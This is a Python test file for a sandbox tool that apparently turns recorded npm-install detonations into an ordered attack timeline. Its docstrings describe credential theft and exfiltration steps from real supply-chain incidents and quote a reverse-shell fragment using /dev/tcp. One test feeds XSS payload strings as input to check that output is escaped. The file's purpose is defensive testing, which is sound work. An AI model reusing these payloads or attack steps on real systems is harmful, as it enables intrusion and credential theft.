"""`brain.timeline` - the ordered narrative, and the claims it is allowed to make.

Mostly driven by the *real* recorded fixtures rather than hand-built events, because the whole
value of this section is that it reads as the attack actually happened. A synthetic fixture
would let me write a story and then assert my own story back.

The two incident reconstructions are the load-bearing cases:
  r01 (ua-parser-js)  geolocate the host, then fetch a payload from a raw IP, twice
  r02 (Shai-Hulud)    read a credential file, fetch trufflehog from GitHub, scan, POST the
                      result to webhook.site
"""

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from brain.github_client import PrMetadata
from brain.llm import LlmOutcome
from brain.pipeline import analyze
from brain.report import render
from brain.rules import evaluate
from brain.timeline import MAX_STEPS, Step, _parse, build_timeline, truncated_count
from brain.verdict import combine
from shared.contract import ConnectEvent, DetonateResult, DnsQuery, ExecEvent, FileEvent

FIXTURES = Path(__file__).parent / "fixtures"


def real(name: str) -> DetonateResult:
    return DetonateResult.model_validate_json(
        (FIXTURES / f"detonate_real_{name}.json").read_text(encoding="utf-8")
    )


def phrases(steps: list[Step]) -> list[str]:
    return [f"{s.actor} {s.action} {s.detail}".strip() for s in steps]


def index_of(steps: list[Step], needle: str) -> int:
    for i, p in enumerate(phrases(steps)):
        if needle in p:
            return i
    raise AssertionError(f"no step matching {needle!r} in:\n  " + "\n  ".join(phrases(steps)))


# --- the recorded incidents, in order ---


def test_shai_hulud_reads_as_the_attack_it_was():
    """The sequence is the finding. Each assertion is an ordering, not a presence check: a set
    of four facts is a list; this order is a narrative."""
    steps = build_timeline(real("r02"))
    script = index_of(steps, "ran the install script node bundle.js")
    cred = index_of(steps, "opened /home/runner/.npmrc")
    fetch = index_of(steps, "connected to release-assets.githubusercontent.com:443")
    unpack = index_of(steps, "tar ran xzf")
    scan = index_of(steps, "trufflehog ran filesystem")
    exfil = index_of(steps, "connected to webhook.site:443")

    assert script < fetch < unpack < scan < exfil
    assert cred < exfil, "the credential read precedes the exfiltration"
    # And the gap that makes it legible: the scan finishes well before the POST.
    assert steps[exfil].offset_s - steps[scan].offset_s > 1.0


def test_ua_parser_js_shows_the_retry_after_the_geolocation():
    steps = build_timeline(real("r01"))
    geo = index_of(steps, "connected to ipinfo.io:443")
    first = index_of(steps, "curl connected to 203.0.113.10:80")
    retry = index_of(steps, "wget connected to 203.0.113.10:80")
    assert geo < first < retry
    # The fallback is three seconds later: a timeout, not a burst.
    assert steps[retry].offset_s - steps[first].offset_s > 2.0


def test_the_dependency_case_attributes_every_step_to_the_package():
    """E8: the author is innocent, so the narrative has to name the dependency."""
    steps = build_timeline(real("dep"))
    connect = steps[index_of(steps, "connected to 203.0.113.10:4444")]
    assert connect.package == "color-helper"
    assert steps[index_of(steps, "ran the install script")].package == "color-helper"


def test_a_benign_real_package_reads_as_benign():
    """re2 fetches a prebuilt binary from GitHub releases. The timeline must not make that
    look like an attack - if everything reads as sinister the section is worthless."""
    steps = build_timeline(real("re2"))
    assert index_of(steps, "connected to registry.npmjs.org:443") >= 0
    assert index_of(steps, "connected to release-assets.githubusercontent.com:443") >= 0
    text = " ".join(phrases(steps)).lower()
    for loaded in ("malicious", "suspicious", "exfiltrat", "attack", "payload", "steal"):
        assert loaded not in text, f"the timeline editorialises with {loaded!r}"


def test_no_step_ever_editorialises_on_any_fixture():
    """Verdict-free by construction: severity belongs to the rule findings, and `action` is
    chosen by this module from a fixed set."""
    allowed = {"install started", "ran the install script", "ran", "connected to", "opened",
               "resolved"}  # fmt: skip
    for name in ("dep", "e4", "e5", "r01", "r02", "re2"):
        for s in build_timeline(real(name)):
            assert s.action in allowed, f"{name}: unexpected action {s.action!r}"


# --- attribution correctness ---


def test_a_payloads_own_shell_is_not_called_an_npm_install_script():
    """Found by eye on the e5 fixture: `bash -i >& /dev/tcp/...` was labelled "npm ran the
    install script", because `is_lifecycle_shell` is also true of a payload's own `sh -c`
    (its parent is the node process npm started). Attributing a reverse shell to npm is a
    false statement about who did what."""
    steps = build_timeline(real("e5"))
    for s in steps:
        if s.action == "ran the install script":
            assert "/dev/tcp" not in s.detail, f"payload shell attributed to npm: {s.detail}"
    # The reverse shell is still reported, as the shell it is.
    assert "/dev/tcp" in " ".join(phrases(steps))
    assert steps[index_of(steps, "/dev/tcp")].actor == "bash"


def test_the_npm_bootstrap_collapses_to_one_step():
    """docker-entrypoint.sh -> npm -> node is identical on every run and says nothing about
    the package, so it is one line rather than three."""
    for name in ("dep", "e4", "r01", "r02", "re2"):
        steps = build_timeline(real(name))
        assert [s.kind for s in steps].count("install") == 1, name


def test_scoped_package_attribution_keeps_both_segments():
    execs = [
        ExecEvent(
            ts="2026-01-01T00:00:00Z",
            pid=1,
            ppid=None,
            binary="/usr/local/bin/npm",
            args="install",
            parent_binary=None,
            uid=0,
        ),  # fmt: skip
        ExecEvent(
            ts="2026-01-01T00:00:01Z",
            pid=2,
            ppid=1,
            binary="/bin/sh",
            args='-c "node i.js"',
            parent_binary="/usr/local/bin/npm",
            uid=0,
            cwd="/work/node_modules/@acme/widget",
        ),  # fmt: skip
    ]
    res = DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                         exec_events=execs, connect_events=[], dns_queries=[],
                         stdout_tail="", stderr_tail="")  # fmt: skip
    steps = build_timeline(res)
    assert steps[index_of(steps, "ran the install script")].package == "@acme/widget"


# --- ordering and timestamps ---


@pytest.mark.parametrize(
    "ts,expected",
    [
        ("2026-11-01T23:12:07.617437730Z", datetime(2026, 11, 1, 23, 12, 7, 617437, tzinfo=UTC)),
        ("2026-11-01T23:12:08Z", datetime(2026, 11, 1, 23, 12, 8, tzinfo=UTC)),
        ("2026-11-01T23:12:08.5Z", datetime(2026, 11, 1, 23, 12, 8, 500000, tzinfo=UTC)),
        ("2026-11-01T23:12:08.617437Z", datetime(2026, 11, 1, 23, 12, 8, 617437, tzinfo=UTC)),
    ],
)
def test_nanosecond_timestamps_parse_and_truncate_to_microseconds(ts, expected):
    """Tetragon emits nine fractional digits; `fromisoformat` accepts at most six."""
    assert _parse(ts) == expected


@pytest.mark.parametrize("bad", ["", None, "t", "not a time", "2026-13-45T99:99:99Z", "12345"])
def test_unparseable_timestamps_are_rejected_rather_than_guessed(bad):
    assert _parse(bad) is None


def test_a_dns_step_never_sorts_before_the_first_precisely_timed_event():
    """DNS carries one-second resolution, so it truncates to the second boundary and sorted
    before "install started" - an ordering that cannot have happened. Observed on r01 and re2.
    """
    for name in ("r01", "re2", "r02"):
        steps = build_timeline(real(name))
        if not any(s.coarse for s in steps):
            continue
        first_precise = next(i for i, s in enumerate(steps) if not s.coarse)
        assert first_precise == 0, f"{name}: a ±1s step sorted ahead of every precise one"
        assert steps[0].kind == "install"


def test_coarse_steps_are_marked_so_the_report_can_say_so():
    steps = build_timeline(real("r02"))
    assert all(s.coarse for s in steps if s.kind == "dns")
    assert not any(s.coarse for s in steps if s.kind in ("connect", "exec", "file"))


def test_offsets_are_relative_and_monotonic():
    for name in ("dep", "e4", "e5", "r01", "r02", "re2"):
        offsets = [s.offset_s for s in build_timeline(real(name))]
        assert offsets[0] == 0.0, name
        assert offsets == sorted(offsets), f"{name}: offsets are not monotonic"


def test_undated_events_sort_last_rather_than_at_time_zero():
    """A missing timestamp must not silently become the start of the story.

    The undated event is deliberately **first** in input order. An earlier version of this
    test listed it last, so it passed even with the ordering broken: a mutation that made
    undated events sort first survived it. Only correct ordering satisfies this version.
    """

    def ex(ts: str, pid: int, binary: str, args: str, ppid=1, parent="/usr/local/bin/node"):
        return ExecEvent(ts=ts, pid=pid, ppid=ppid, binary=binary, args=args,
                         parent_binary=parent, uid=0)  # fmt: skip

    execs = [
        ex("whenever", 9, "/usr/bin/curl", "http://x"),
        ex("2026-01-01T00:00:00Z", 1, "/usr/local/bin/npm", "install", ppid=None, parent=None),
        ex("2026-01-01T00:00:05Z", 11, "/usr/bin/wget", "http://y"),
    ]
    res = DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                         exec_events=execs, connect_events=[], dns_queries=[],
                         stdout_tail="", stderr_tail="")  # fmt: skip
    steps = build_timeline(res)
    assert [s.actor for s in steps] == ["npm", "wget", "curl"]
    assert steps[-1].actor == "curl" and steps[-1].offset_s is None
    assert steps[0].offset_s == 0.0, "a dated event anchors t=0, not the undated one"


# --- robustness ---


def test_an_empty_or_blind_result_yields_no_narrative():
    res = DetonateResult(job_id="j", status="timeout", exit_code=None, duration_s=1,
                         exec_events=[], connect_events=[], dns_queries=[],
                         stdout_tail="", stderr_tail="")  # fmt: skip
    assert build_timeline(res) == []


def test_the_cap_is_reported_rather_than_silently_dropping_events():
    execs = [
        ExecEvent(
            ts=f"2026-01-01T00:00:{i:02d}Z",
            pid=100 + i,
            ppid=1,
            binary="/usr/bin/curl",
            args=f"http://host{i}",
            parent_binary="/usr/local/bin/node",
            uid=0,
        )  # fmt: skip
        for i in range(MAX_STEPS + 6)
    ]
    res = DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                         exec_events=execs, connect_events=[], dns_queries=[],
                         stdout_tail="", stderr_tail="")  # fmt: skip
    steps = build_timeline(res)
    assert truncated_count(steps) == len(steps) - MAX_STEPS > 0
    body = render(combine([], LlmOutcome("m", error="x", skipped=True), res),
                  [], LlmOutcome("m", error="x", skipped=True), res,
                  job_id="j", timeline=steps)  # fmt: skip
    assert f"… {truncated_count(steps)} further event(s) not shown." in body


# --- it is report-only, and it escapes untrusted content ---


def benign_llm(*_, **__):
    return LlmOutcome("m", error="skipped", skipped=True)


def meta() -> PrMetadata:
    return PrMetadata(title="Bump a dependency", body="Routine.", author="bot",
                      changed_files=["package.json"], package_json_changed=True,
                      scripts_changed=False, lockfile_changed=False,
                      added_dependencies=["color-helper"])  # fmt: skip


@pytest.mark.parametrize(
    "name,expected",
    [
        ("dep", "Blocked"),
        ("e4", "Blocked"),
        ("e5", "Blocked"),
        ("r01", "Blocked"),
        ("r02", "Blocked"),
    ],  # fmt: skip
)
def test_adding_the_timeline_moved_no_verdict(name, expected):
    """The regression that would matter. The timeline is built after `combine()` and passed
    only to `render()`, so it cannot reach a verdict - asserted end to end rather than argued
    from where the call sits."""
    out = analyze(real(name), meta(), "", benign_llm, job_id="j", enrich=lambda r: r)
    assert out.final.title == expected


def test_the_verdict_is_identical_whether_or_not_a_timeline_is_rendered():
    res = real("r02")
    hits = evaluate(res)
    llm = LlmOutcome("m", error="x", skipped=True)
    final = combine(hits, llm, res)
    with_tl = render(final, hits, llm, res, job_id="j", timeline=build_timeline(res))
    without = render(final, hits, llm, res, job_id="j")
    assert "What happened, in order" in with_tl
    assert "What happened, in order" not in without
    # The verdict heading, which is what GitHub keys the check on, is untouched.
    assert with_tl.splitlines()[0] == without.splitlines()[0]


def test_hostile_record_content_is_escaped_in_the_section():
    """Actor, detail and package all come from a sandbox that ran untrusted code."""
    execs = [
        ExecEvent(
            ts="2026-01-01T00:00:00Z",
            pid=1,
            ppid=None,
            binary="/usr/local/bin/npm",
            args="install",
            parent_binary=None,
            uid=0,
        ),  # fmt: skip
        ExecEvent(
            ts="2026-01-01T00:00:01Z",
            pid=2,
            ppid=1,
            binary="/bin/sh",
            args='-c "<img src=x onerror=alert(1)>"',
            parent_binary="/usr/local/bin/npm",
            uid=0,
            cwd="/work/node_modules/<script>evil</script>",
        ),  # fmt: skip
    ]
    connects = [
        ConnectEvent(
            ts="2026-01-01T00:00:02Z",
            pid=2,
            binary="/usr/bin/<img src=x>",
            daddr="1.2.3.4",
            dport=80,
            family="AF_INET",
            resolved_domain="evil.example|<b>",
        ),  # fmt: skip
    ]
    files = [FileEvent(ts="2026-01-01T00:00:03Z", pid=2, binary="/usr/bin/node",
                       path="/home/runner/<script>.aws")]  # fmt: skip
    dns = [DnsQuery(ts="2026-01-01T00:00:03Z", domain="<i>evil</i>", answers=["<b>1.2.3.4</b>"])]
    res = DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                         exec_events=execs, connect_events=connects, dns_queries=dns,
                         file_events=files, stdout_tail="", stderr_tail="")  # fmt: skip
    llm = LlmOutcome("m", error="x", skipped=True)
    body = render(combine([], llm, res), [], llm, res, job_id="j", timeline=build_timeline(res))

    section = body.split("### What happened, in order", 1)[1]
    for raw in ("<img", "<script>", "<b>", "<i>", "onerror=alert(1)"):
        assert raw not in section, f"{raw!r} reached the comment unescaped"
    assert "&#60;" in section or "&lt;" in section, "the content should still be shown, escaped"


def test_a_one_step_timeline_renders_no_section():
    """A lone "install started" line is not a narrative, and an empty section is noise."""
    execs = [
        ExecEvent(
            ts="2026-01-01T00:00:00Z",
            pid=1,
            ppid=None,
            binary="/usr/local/bin/npm",
            args="install",
            parent_binary=None,
            uid=0,
        )
    ]
    res = DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                         exec_events=execs, connect_events=[], dns_queries=[],
                         stdout_tail="", stderr_tail="")  # fmt: skip
    steps = build_timeline(res)
    assert len(steps) == 1
    llm = LlmOutcome("m", error="x", skipped=True)
    body = render(combine([], llm, res), [], llm, res, job_id="j", timeline=steps)
    assert "What happened, in order" not in body


def test_decoy_values_are_not_reintroduced_by_the_timeline():
    """The pipeline builds the timeline from the redacted view. If it ever used the raw
    result instead, a canary credential value could reach the comment."""
    res = real("r02")
    secret = "decoy-value-must-not-appear"
    res = res.model_copy(update={"decoys": {"NPM_TOKEN": secret}})
    res = res.model_copy(update={"stdout_tail": f"printed {secret}", "stderr_tail": ""})
    out = analyze(res, meta(), "", benign_llm, job_id="j", enrich=lambda r: r)
    assert secret not in out.report


def test_the_section_is_absent_when_the_caller_passes_nothing():
    """Backwards compatibility: `render` is called from places that do not build a timeline."""
    res = real("dep")
    llm = LlmOutcome("m", error="x", skipped=True)
    body = render(combine([], llm, res), [], llm, res, job_id="j")
    assert "What happened, in order" not in body


def test_the_fixtures_this_file_relies_on_are_real_recordings():
    """These assertions are only worth anything if the fixtures are recorded Chamber output,
    not something handwritten to match."""
    for name in ("r01", "r02", "dep", "re2"):
        raw = json.loads((FIXTURES / f"detonate_real_{name}.json").read_text(encoding="utf-8"))
        assert raw["exec_events"], name
        # Real Tetragon timestamps carry nanosecond precision; a handwritten fixture would not.
        fracs = [e["ts"].split(".")[-1] for e in raw["exec_events"] if "." in e["ts"]]
        assert fracs and all(len(f.rstrip("Z")) == 9 for f in fracs), name
